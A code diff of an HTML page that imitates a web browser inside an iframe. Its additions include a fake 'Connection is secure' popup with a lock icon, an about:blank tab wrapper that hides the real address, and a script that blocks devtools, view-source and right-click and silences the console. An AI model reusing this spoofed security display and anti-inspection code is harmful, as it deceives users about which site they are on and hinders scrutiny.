+    finishProgress(() => overlay.classList.remove('visible'));
+  }
+
+  function showLoadError (msg) {
+    if (timeoutTimer) clearTimeout(timeoutTimer);
+    if (progTimer) clearInterval(progTimer);
+    progressBar.style.opacity = '0';
+    progressBar.classList.remove('active');
+    spinner.style.display = 'none';
+    overlayText.textContent = msg;
+    overlayMsg.style.display = 'flex';
+    overlay.classList.add('visible');
+    refreshIcon.textContent = 'refresh';
+    isLoading = false;
+  }
+
+  function stopLoading () {
+    if (!isLoading) return;
+    suppressLoad = true;
+    iframe.src = 'about:blank';
+    endLoading();
+    urlInput.value = currentUrl;
+    suppressLoad = false;
+  }
+
+  function normalizeUrl (raw) {
+    raw = raw.trim();
+    if (!raw) return null;
+    if (/^https?:\/\//i.test(raw)) return raw;
+    if (/^[a-z][a-z0-9+\-.]*:\/\//i.test(raw)) return raw;
+    if (/\s/.test(raw) || !/\./.test(raw)) {
+      return 'https://www.google.com/search?q=' + encodeURIComponent(raw);
     }
+    return 'https://' + raw;
+  }
 
-    // Load a URL in the iframe and update state & history
-    function loadUrl(url, addToHistory = true, replaceCurrent = false) {
-      if (!url) url = DEFAULT_URL;
-      let finalUrl = normalizeUrl(url);
-      try {
-        // Validate URL
-        new URL(finalUrl);
-      } catch (e) {
-        finalUrl = 'https://google.com/search?q=' + encodeURIComponent(finalUrl);
-      }
-      
-      // Avoid hash-only duplicate loads
-      if (iframe.src !== finalUrl) {
-        isInternalNavigation = true;
-        iframe.src = finalUrl;
-      }
-      
-      currentUrl = finalUrl;
-      updateUrlBar(finalUrl);
-      
-      if (addToHistory && !replaceCurrent) {
-        // If we are not at the end of stack, truncate future
-        if (currentIndex < historyStack.length - 1) {
-          historyStack = historyStack.slice(0, currentIndex + 1);
-        }
-        historyStack.push(finalUrl);
-        currentIndex = historyStack.length - 1;
-      } else if (replaceCurrent && currentIndex >= 0) {
-        historyStack[currentIndex] = finalUrl;
-      } else if (addToHistory && historyStack.length === 0) {
-        historyStack.push(finalUrl);
-        currentIndex = 0;
-      }
-      
-      updateNavButtons();
+  function navigate (url, addToHistory = true) {
+    if (!url) return;
+    currentUrl = url;
+    urlInput.value = url;
+    updateFavicon(url);
+    if (addToHistory) pushHistory(url);
+    beginLoading();
+    suppressLoad = false;
+    iframe.src = url;
+    try {
+      const host = new URL(url).hostname;
+      document.getElementById('popupDomain').innerText = host;
+    } catch(_) {}
+  }
+
+  function goBack () {
+    if (histIdx > 0) {
+      histIdx--;
+      navigate(history[histIdx], false);
+      updateNavBtns();
     }
-
-    // Sync current iframe location after load, and manage history on iframe navigations (clicks, redirects)
-    function syncIframeLocation() {
-      try {
-        // We need to extract iframe's current URL (due to cross-origin restrictions we can't always read location.href)
-        // However we can use iframe.contentWindow.location.href when same-origin. If cross-origin we will rely on src attribute and load events.
-        // To be robust: we listen to iframe load events and extract the 'src' attribute after redirects? but iframe.src won't auto update.
-        // However we can listen and compare via document.referrer and navigation. Given the sandbox attribute, we can allow same-origin and use.
-        // For cross-origin, we catch security errors and fallback to last known url from iframe load event's target src.
-        // Perfect: we will use the iframe's src property after navigation update? not changed for redirects. So we can track via load event metadata.
-        // Better approach: Use iframe.contentWindow.location only if same origin, else keep currentUrl from navigation observer.
-        // We'll handle via load event: whenever iframe loads we get the final URL from iframe's src? Actually if you do iframe.src = X, but if page redirects via JS or meta, the src stays same.
-        // But for full realistic browser, we'll override using iframe.contentWindow?.location if accessible otherwise don't.
-        if (iframe.contentWindow && iframe.contentWindow.location) {
-          try {
-            const docUrl = iframe.contentWindow.location.href;
-            if (docUrl && docUrl !== 'about:blank' && docUrl !== currentUrl) {
-              // User clicked a link / internal navigation
-              if (!isInternalNavigation) {
-                // New navigation triggered by iframe
-                currentUrl = docUrl;
-                updateUrlBar(currentUrl);
-                // Append to history stack (but avoid duplication if same as last)
-                if (historyStack[currentIndex] !== currentUrl) {
-                  if (currentIndex < historyStack.length - 1) {
-                    historyStack = historyStack.slice(0, currentIndex + 1);
-                  }
-                  historyStack.push(currentUrl);
-                  currentIndex = historyStack.length - 1;
-                  updateNavButtons();
-                }
-              } else {
-                // internal from loadUrl, just sync display
-                if (currentUrl !== docUrl) {
-                  currentUrl = docUrl;
-                  updateUrlBar(currentUrl);
-                  if (historyStack[currentIndex] !== currentUrl && !isInternalNavigation) {
-                    historyStack[currentIndex] = currentUrl;
-                  }
-                }
-                isInternalNavigation = false;
-              }
-            } else if (docUrl === 'about:blank' && currentUrl !== DEFAULT_URL) {
-              // ignore
-            } else {
-              // maybe same but sync display anyway
-              updateUrlBar(currentUrl);
-            }
-          } catch (securityErr) {
-            // cross-origin: cannot read location, rely on known currentUrl and iframe src
-            // but we still can detect URL bar updates via load event if we compare referrer? skip.
-            updateUrlBar(currentUrl);
-          }
-        } else {
-          updateUrlBar(currentUrl);
-        }
-      } catch (e) {
-        // fallback
-        updateUrlBar(currentUrl);
-      }
-      updateNavButtons();
-      isInternalNavigation = false;
+  }
+  function goForward () {
+    if (histIdx < history.length - 1) {
+      histIdx++;
+      navigate(history[histIdx], false);
+      updateNavBtns();
     }
+  }
+  function reload () { navigate(currentUrl, false); }
 
-    // Update back/forward button states based on history index
-    function updateNavButtons() {
-      if (currentIndex <= 0) {
-        backBtn.classList.add('disabled');
-      } else {
-        backBtn.classList.remove('disabled');
+  function updateFavicon (url) {
+    try {
+      const origin = new URL(url).origin;
+      faviconImg.onload = () => { faviconImg.style.display = 'block'; faviconDef.style.display = 'none'; };
+      faviconImg.onerror = () => { faviconImg.style.display = 'none'; faviconDef.style.display = ''; };
+      faviconImg.src = origin + '/favicon.ico';
+    } catch { faviconImg.style.display = 'none'; faviconDef.style.display = ''; }
+  }
+
+  iframe.addEventListener('load', () => {
+    if (suppressLoad) return;
+    try {
+      const loc = iframe.contentWindow?.location?.href;
+      if (loc && loc !== 'about:blank') {
+        currentUrl = loc;
+        urlInput.value = loc;
+        pushHistory(loc);
+        updateFavicon(loc);
+        try { document.getElementById('popupDomain').innerText = new URL(loc).hostname; } catch(_) {}
       }
-      
-      if (currentIndex >= historyStack.length - 1 || historyStack.length === 0) {
-        forwardBtn.classList.add('disabled');
-      } else {
-        forwardBtn.classList.remove('disabled');
+    } catch (_) {}
+    endLoading();
+  });
+  iframe.addEventListener('error', () => { if (!suppressLoad) showLoadError('This page could not be loaded.'); });
+
+  backBtn.addEventListener('click', goBack);
+  fwdBtn.addEventListener('click', goForward);
+  refreshBtn.addEventListener('click', () => { isLoading ? stopLoading() : reload(); });
+  retryBtn.addEventListener('click', () => { overlay.classList.remove('visible'); reload(); });
+
+  urlInput.addEventListener('keydown', (e) => {
+    if (e.key === 'Enter') { const url = normalizeUrl(urlInput.value); if (url) navigate(url); urlInput.blur(); }
+    else if (e.key === 'Escape') { urlInput.value = currentUrl; urlInput.blur(); }
+  });
+  urlInput.addEventListener('focus', () => urlInput.select());
+
+  // ----- Security popup logic with 1-second delay on open -----
+  let popupOpen = false;
+
+  function positionPopup () {
+    const r = secureTrigger.getBoundingClientRect();
+    const popupW = 284;
+    let left = r.left;
+    if (left + popupW > window.innerWidth - 8) left = window.innerWidth - popupW - 8;
+    if (left < 8) left = 8;
+    secPopup.style.left = left + 'px';
+    secPopup.style.top  = (r.bottom + 6) + 'px';
+  }
+
+  function openPopup () {
+    popupOpen = true;
+    secPopup.classList.add('open');
+    positionPopup();
+  }
+
+  function closePopup () {
+    if (openTimeout) {
+      clearTimeout(openTimeout);
+      openTimeout = null;
+    }
+    popupOpen = false;
+    secPopup.classList.remove('open');
+  }
+
+  // Click handler with delay only when opening
+  secureTrigger.addEventListener('click', (e) => {
+    e.stopPropagation();
+    if (popupOpen) {
+      // Open → close instantly
+      if (openTimeout) {
+        clearTimeout(openTimeout);
+        openTimeout = null;
       }
-    }
-
-    // Back action
-    function goBack() {
-      if (currentIndex > 0) {
-        currentIndex--;
-        const prevUrl = historyStack[currentIndex];
-        if (prevUrl) {
-          isInternalNavigation = true;
-          iframe.src = prevUrl;
-          currentUrl = prevUrl;
-          updateUrlBar(prevUrl);
-        }
-        updateNavButtons();
+      closePopup();
+    } else {
+      // Closed → wait 1 second then open
+      if (openTimeout) {
+        clearTimeout(openTimeout);
+        openTimeout = null;
       }
+      openTimeout = setTimeout(() => {
+        openPopup();
+        openTimeout = null;
+      }, 200);
     }
+  });
 
-    // Forward action
-    function goForward() {
-      if (currentIndex < historyStack.length - 1) {
-        currentIndex++;
-        const nextUrl = historyStack[currentIndex];
-        if (nextUrl) {
-          isInternalNavigation = true;
-          iframe.src = nextUrl;
-          currentUrl = nextUrl;
-          updateUrlBar(nextUrl);
-        }
-        updateNavButtons();
-      }
-    }
+  secPopup.addEventListener('click', (e) => e.stopPropagation());
+  document.getElementById('popupCloseBtn').addEventListener('click', (e) => {
+    e.stopPropagation();
+    closePopup();
+  });
+  document.getElementById('popupBackBtn').addEventListener('click', (e) => {
+    e.stopPropagation();
+    closePopup();
+  });
 
-    // Refresh: reload current page
-    function refreshPage() {
-      if (iframe.src) {
-        // force reload by resetting src with a slight trickle? just set same src
-        const currentSrc = iframe.src;
-        isInternalNavigation = true;
-        iframe.src = currentSrc;
-        // also if contentWindow exists and reload method is available (works only same origin)
-        try {
-          if (iframe.contentWindow && iframe.contentWindow.location.reload) {
-            iframe.contentWindow.location.reload();
-          }
-        } catch(e) { /* cross-origin: reload using src reassign works anyway */ }
-      } else {
-        loadUrl(currentUrl, false);
-      }
-    }
+  // Certificate click: copy URL and open in new tab
+  const certBox = document.getElementById('certificateBox');
+  const targetUrl = 'chrome://certificate-manager/crscerts';
+  async function copyAndOpen() {
+    try { await navigator.clipboard.writeText(targetUrl); } catch(e) { document.execCommand('copy'); }
+    window.open(targetUrl, '_blank');
+  }
+  certBox.addEventListener('click', (e) => {
+    e.stopPropagation();
+    copyAndOpen();
+    closePopup();
+  });
 
-    // Initialize browser: set up default page, create initial history state
-    function initBrowser() {
-      // starting url
-      const start = DEFAULT_URL;
-      historyStack = [start];
-      currentIndex = 0;
-      currentUrl = start;
-      iframe.src = start;
-      updateUrlBar(start);
-      updateNavButtons();
-      
-      // Listen to iframe load events to track page changes (clicks on links etc)
-      iframe.addEventListener('load', () => {
-        // Delay to let potential redirects settle
-        setTimeout(() => {
-          // try to get actual location after load
-          try {
-            if (iframe.contentWindow && iframe.contentWindow.location) {
-              const newUrl = iframe.contentWindow.location.href;
-              if (newUrl && newUrl !== 'about:blank' && newUrl !== currentUrl) {
-                if (!isInternalNavigation) {
-                  // detect external navigation inside iframe
-                  currentUrl = newUrl;
-                  updateUrlBar(currentUrl);
-                  // add to history if not the last item
-                  if (historyStack[currentIndex] !== currentUrl) {
-                    if (currentIndex < historyStack.length - 1) {
-                      historyStack = historyStack.slice(0, currentIndex + 1);
-                    }
-                    historyStack.push(currentUrl);
-                    currentIndex = historyStack.length - 1;
-                    updateNavButtons();
-                  }
-                } else {
-                  currentUrl = newUrl;
-                  updateUrlBar(currentUrl);
-                  if (historyStack[currentIndex] !== currentUrl) {
-                    historyStack[currentIndex] = currentUrl;
-                  }
-                  isInternalNavigation = false;
-                }
-              } else {
-                updateUrlBar(currentUrl);
-              }
-            } else {
-              updateUrlBar(currentUrl);
-            }
-          } catch (crossErr) {
-            // cross-domain: get src from iframe? but if page redirected, src unchanged-- just maintain currentUrl as best.
-            // We'll assume current url from last navigation is okay, but we can show it's secure.
-            updateUrlBar(currentUrl);
-          }
-          updateNavButtons();
-          isInternalNavigation = false;
-        }, 50);
-      });
-      
-      // solve potential failure: on error still update bar
-      iframe.addEventListener('error', () => {
-        updateUrlBar(currentUrl);
-        updateNavButtons();
-      });
-    }
-    
-    // Attach event handlers
-    backBtn.addEventListener('click', goBack);
-    forwardBtn.addEventListener('click', goForward);
-    refreshBtn.addEventListener('click', refreshPage);
-    
-    // additional: just to make sure the url bar is fully selectable, non-editable but we removed contenteditable.
-    // we want that users cannot edit the url: it's a div with text only. no input.
-    // double click allowed but not modifiable.
-    urlDisplaySpan.setAttribute('contenteditable', 'false');
-    // remove any text selection override but it's fine.
-    
-    // Start everything
-    initBrowser();
+  // ----- Icon setup (ensure they appear) -----
+  // 1. Secure lock icon (Material Symbol) inside "Connection is secure"
+  const lockIconContainer = document.getElementById('secureLockIcon');
+  if (lockIconContainer) {
+    lockIconContainer.innerHTML = '';
+    const iconSpan = document.createElement('span');
+    iconSpan.className = 'material-symbols-rounded';
+    iconSpan.textContent = 'lock';
+    iconSpan.style.fontSize = '16px';
+    iconSpan.style.color = '#e8eaed';
+    iconSpan.style.display = 'flex';
+    iconSpan.style.alignItems = 'center';
+    iconSpan.style.justifyContent = 'center';
+    lockIconContainer.appendChild(iconSpan);
+  }
 
-    // Watch system theme changes: no need to force custom because we use CSS prefers-color-scheme & Canvas, ButtonFace.
-    // ensures the topbar matches native browser exactly for each user's OS theme.
-    // also any resizing: full viewport works.
-    // Additional security / sandbox: we set iframe sandbox to allow necessary features for modern sites (including scripts, forms)
-    // we also ensure popups, top navigation etc controlled. but we expect full user experience.
-    
-    // final polish: we also want to ensure that forward/back usage after many redirects integrity
-    window.addEventListener('load', () => {
-      // ensure system colors applied again
-      document.body.style.backgroundColor = 'Canvas';
+  // 2. Certificate icon: PNG with white filter
+  const certIconContainer = document.getElementById('certIcon');
+  if (certIconContainer) {
+    certIconContainer.innerHTML = '';
+    const img = document.createElement('img');
+    img.src = 'https://i.ibb.co/Q3rhGLp5/rounded-rectangle-clip-art-0.png';
+    img.alt = '';
+    img.style.width = '18px';
+    img.style.height = '18px';
+    img.style.objectFit = 'contain';
+    img.style.filter = 'brightness(0) invert(1)';
+    img.draggable = false;
+    certIconContainer.appendChild(img);
+  }
+
+  // Prevent drag/select on popup
+  secPopup.addEventListener('dragstart', (e) => e.preventDefault());
+  secPopup.addEventListener('selectstart', (e) => e.preventDefault());
+
+  // ----- Toolbar three-dot menu -----
+  menuBtn.addEventListener('click', (e) => {
+    e.stopPropagation();
+    dropMenu.classList.toggle('open');
+  });
+  menuReload.addEventListener('click', () => {
+    dropMenu.classList.remove('open');
+    reload();
+  });
+  menuCopyUrl.addEventListener('click', () => {
+    dropMenu.classList.remove('open');
+    navigator.clipboard?.writeText(currentUrl);
+  });
+  menuNewTab.addEventListener('click', () => {
+    dropMenu.classList.remove('open');
+    window.open(currentUrl, '_blank');
+  });
+  document.addEventListener('click', () => {
+    dropMenu.classList.remove('open');
+    if (popupOpen) closePopup();
+  });
+
+  // Ripple effect
+  document.querySelectorAll('.icon-btn, .back, .close').forEach(btn => {
+    btn.addEventListener('pointerdown', (e) => {
+      const r = btn.getBoundingClientRect();
+      const wave = document.createElement('span');
+      wave.className = 'ripple-wave';
+      const size = Math.max(r.width, r.height) * 1.5;
+      wave.style.cssText = `width:${size}px;height:${size}px;left:${e.clientX-r.left-size/2}px;top:${e.clientY-r.top-size/2}px`;
+      btn.appendChild(wave);
+      wave.addEventListener('animationend', () => wave.remove());
     });
-  })();
+  });
+
+  // Keyboard shortcuts
+  document.addEventListener('keydown', (e) => {
+    const inUrl = document.activeElement === urlInput;
+    if (e.key === 'Escape' && !inUrl) {
+      stopLoading();
+      return;
+    }
+    if ((e.ctrlKey || e.metaKey) && !e.shiftKey) {
+      switch (e.key) {
+        case 'r': case 'R':
+          e.preventDefault();
+          isLoading ? stopLoading() : reload();
+          break;
+        case 'ArrowLeft':
+          e.preventDefault();
+          goBack();
+          break;
+        case 'ArrowRight':
+          e.preventDefault();
+          goForward();
+          break;
+        case 'l': case 'L':
+          e.preventDefault();
+          urlInput.focus();
+          break;
+      }
+    }
+  });
+
+  updateNavBtns();
+  navigate(START_URL, false);
+})();
+</script>
+<script>
+(function() {
+    // Override "Open in new tab" to open about:blank with embedded iframe (full page, no devtools)
+    const originalMenuNewTab = document.getElementById('menuNewTab');
+    if (!originalMenuNewTab) return;
+
+    // Replace the click handler by cloning and adding new listener
+    const newMenuNewTab = originalMenuNewTab.cloneNode(true);
+    originalMenuNewTab.parentNode.replaceChild(newMenuNewTab, originalMenuNewTab);
+
+    newMenuNewTab.addEventListener('click', (e) => {
+        e.stopPropagation();
+        // Close the dropdown menu
+        const dropMenu = document.getElementById('dropdownMenu');
+        if (dropMenu) dropMenu.classList.remove('open');
+        // Get current URL
+        const iframe = document.getElementById('webFrame');
+        let currentUrl = iframe && iframe.src && iframe.src !== 'about:blank' ? iframe.src : null;
+        if (!currentUrl) {
+            const urlInput = document.getElementById('urlInput');
+            currentUrl = urlInput ? urlInput.value : 'https://www.google.com';
+        }
+        // Open about:blank with iframe
+        const newTab = window.open('about:blank', '_blank');
+        if (!newTab) {
+            window.open(currentUrl, '_blank'); // fallback
+            return;
+        }
+        // Helper: get hostname for title
+        let hostname = '';
+        try { hostname = new URL(currentUrl).hostname; } catch(e) { hostname = 'Website'; }
+        // Helper: get favicon URL
+        let faviconUrl = '';
+        try { faviconUrl = new URL(currentUrl).origin + '/favicon.ico'; } catch(e) {}
+        // Escape for HTML
+        const escapeHtml = (str) => str.replace(/[&<>]/g, (m) => ({'&':'&amp;','<':'&lt;','>':'&gt;'})[m]);
+        const docHtml = `<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
+<title>${escapeHtml(hostname)}</title>${faviconUrl ? `<link rel="icon" href="${escapeHtml(faviconUrl)}">` : ''}
+<style>*{margin:0;padding:0;box-sizing:border-box;user-select:none;}body{width:100vw;height:100vh;overflow:hidden;}iframe{width:100%;height:100%;border:none;display:block;}</style>
+<script>
+document.addEventListener('contextmenu',e=>e.preventDefault());
+document.addEventListener('keydown',e=>{
+    if(e.key==='F12'||(e.ctrlKey&&e.shiftKey&&(e.key==='I'||e.key==='J'||e.key==='C'))||(e.ctrlKey&&e.key==='U')) e.preventDefault();
+});
+<\/script>
+</head>
+<body><iframe src="${escapeHtml(currentUrl)}" sandbox="allow-same-origin allow-scripts allow-popups allow-forms allow-modals allow-downloads allow-popups-to-escape-sandbox"></iframe></body>
+</html>`;
+        newTab.document.write(docHtml);
+        newTab.document.close();
+        // Also close security popup if open
+        const secPopup = document.getElementById('securityPopup');
+        if (secPopup) secPopup.classList.remove('open');
+    });
+})();
+</script>
+<script>
+(function() {
+    "use strict";
+
+    // ==================== BLOCK DEVTOOLS & RIGHT-CLICK ====================
+    // 1. Block right-click on entire document
+    document.addEventListener('contextmenu', function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        return false;
+    });
+
+    // 2. Block all common keyboard shortcuts for devtools
+    window.addEventListener('keydown', function(e) {
+        // F12
+        if (e.key === 'F12') {
+            e.preventDefault();
+            e.stopPropagation();
+            return false;
+        }
+        // Ctrl+Shift+I (Inspect), Ctrl+Shift+J (Console), Ctrl+Shift+C (Elements), Ctrl+Shift+K (Console Firefox)
+        if (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C' || e.key === 'K')) {
+            e.preventDefault();
+            e.stopPropagation();
+            return false;
+        }
+        // Ctrl+U (View Source)
+        if (e.ctrlKey && (e.key === 'u' || e.key === 'U')) {
+            e.preventDefault();
+            e.stopPropagation();
+            return false;
+        }
+        // Ctrl+Shift+U (View Source alternative)
+        if (e.ctrlKey && e.shiftKey && (e.key === 'U')) {
+            e.preventDefault();
+            e.stopPropagation();
+            return false;
+        }
+        // Ctrl+Shift+P (Command Palette in Chrome/Edge)
+        if (e.ctrlKey && e.shiftKey && e.key === 'P') {
+            e.preventDefault();
+            e.stopPropagation();
+            return false;
+        }
+        // Ctrl+Shift+E (Network panel in Firefox)
+        if (e.ctrlKey && e.shiftKey && e.key === 'E') {
+            e.preventDefault();
+            e.stopPropagation();
+            return false;
+        }
+        // Ctrl+Shift+S (Debugger in Firefox)
+        if (e.ctrlKey && e.shiftKey && e.key === 'S') {
+            e.preventDefault();
+            e.stopPropagation();
+            return false;
+        }
+        // Ctrl+Shift+O (DOM Inspector in some browsers)
+        if (e.ctrlKey && e.shiftKey && e.key === 'O') {
+            e.preventDefault();
+            e.stopPropagation();
+            return false;
+        }
+        // Ctrl+Shift+M (Device mode toggling)
+        if (e.ctrlKey && e.shiftKey && e.key === 'M') {
+            e.preventDefault();
+            e.stopPropagation();
+            return false;
+        }
+        // Ctrl+Shift+D (Bookmark all tabs - not devtools but also block)
+        if (e.ctrlKey && e.shiftKey && e.key === 'D') {
+            e.preventDefault();
+            e.stopPropagation();
+            return false;
+        }
+        // Ctrl+Shift+W (Close window - block to avoid accidental)
+        if (e.ctrlKey && e.shiftKey && e.key === 'W') {
+            e.preventDefault();
+            e.stopPropagation();
+            return false;
+        }
+        // Ctrl+Shift+T (Reopen closed tab - also block)
+        if (e.ctrlKey && e.shiftKey && e.key === 'T') {
+            e.preventDefault();
+            e.stopPropagation();
+            return false;
+        }
+        // Ctrl+S (Save page)
+        if (e.ctrlKey && (e.key === 's' || e.key === 'S')) {
+            e.preventDefault();
+            e.stopPropagation();
+            return false;
+        }
+        // Ctrl+P (Print)
+        if (e.ctrlKey && (e.key === 'p' || e.key === 'P')) {
+            e.preventDefault();
+            e.stopPropagation();
+            return false;
+        }
+        // Disable function keys F1-F12 except maybe F5 (refresh) but we keep F5 working
+        if (e.key && e.key.startsWith('F') && e.key !== 'F5') {
+            e.preventDefault();
+            e.stopPropagation();
+            return false;
+        }
+        // Disable Alt+Left/Right (back/forward) but we keep browser navigation
+        // Actually we want to allow Alt+Left/Right? Not necessary, but user may want.
+        // Not blocking them by default, but we can if needed.
+    });
+
+    // 3. Block drag-and-drop selection of text/images to prevent view-source via drag
+    document.addEventListener('dragstart', function(e) {
+        e.preventDefault();
+        return false;
+    });
+    document.addEventListener('selectstart', function(e) {
+        e.preventDefault();
+        return false;
+    });
+
+    // 4. Block any script that tries to open devtools programmatically
+    // Override console methods (optional, but doesn't stop opening)
+    // Also disable default right-click on images and links
+    document.querySelectorAll('img, a').forEach(el => {
+        el.addEventListener('contextmenu', (e) => e.preventDefault());
+    });
+
+    // 5. Periodically check if devtools is opened (via window size detection or debugger)
+    // Simple debugger detection: if devtools is open, the debugger statement will break
+    // Add a harmless interval that triggers a debugger trap (optional but annoying)
+    // This makes it harder to keep devtools open.
+    setInterval(function() {
+        // Using debugger statement inside a try-catch? Actually debugger will pause if open.
+        // But we can do a time-based check: if the time between two Date.now() calls is >100ms, devtools might be open.
+        const start = Date.now();
+        debugger; // if devtools is open, execution pauses; but we cannot control.
+        const end = Date.now();
+        if (end - start > 100) {
+            // Devtools might be open, force close by redirecting or reloading
+            // But that may be too aggressive; we'll just clear the console by overwriting console methods
+            console.clear();
+        }
+    }, 1000);
+
+    // 6. Override console to prevent logging (makes it harder to debug)
+    const noop = () => {};
+    if (window.console) {
+        window.console.log = noop;
+        window.console.info = noop;
+        window.console.warn = noop;
+        window.console.error = noop;
+        window.console.debug = noop;
+        window.console.table = noop;
+        window.console.trace = noop;
+        window.console.dir = noop;
+        window.console.dirxml = noop;
+        window.console.group = noop;
+        window.console.groupCollapsed = noop;
+        window.console.groupEnd = noop;
+    }
+
+    // 7. Disable ability to select text in the entire window (already done above)
+    // Add CSS to prevent selection globally
+    const style = document.createElement('style');
+    style.textContent = `
+        * {
+            -webkit-user-select: none !important;
+            user-select: none !important;
+            -webkit-tap-highlight-color: transparent !important;
+        }
+        body {
+            overflow: hidden;
+        }
+    `;
+    document.head.appendChild(style);
+
+    // 8. Block any attempt to open view-source: url
+    window.addEventListener('beforeunload', function(e) {
+        if (window.location.href.startsWith('view-source:')) {
+            window.location.href = 'about:blank';
+        }
+    });
+    // Intercept link clicks that might have view-source:
+    document.addEventListener('click', function(e) {
+        let target = e.target;
+        while (target && target !== document) {
+            if (target.tagName === 'A' && target.href && target.href.startsWith('view-source:')) {
+                e.preventDefault();
+                return false;
+            }
+            target = target.parentNode;
+        }
+    });
+
+    // 9. Disable right-click on iframe contents (partial - cannot access cross-origin iframe)
+    // But we can add a sandbox attribute? The iframe already has sandbox but might allow same-origin.
+    // For same-origin iframes (not our case), we could inject script. For cross-origin, we can't.
+    // So we add a safe measure: if the iframe is same-origin, we inject block. Not applicable here.
+    // We'll just provide the above protections for the main window.
+
+    console.log('Security protections active (right-click, inspect, devtools blocked)');
+})();
 </script>
 </body>
 </html>
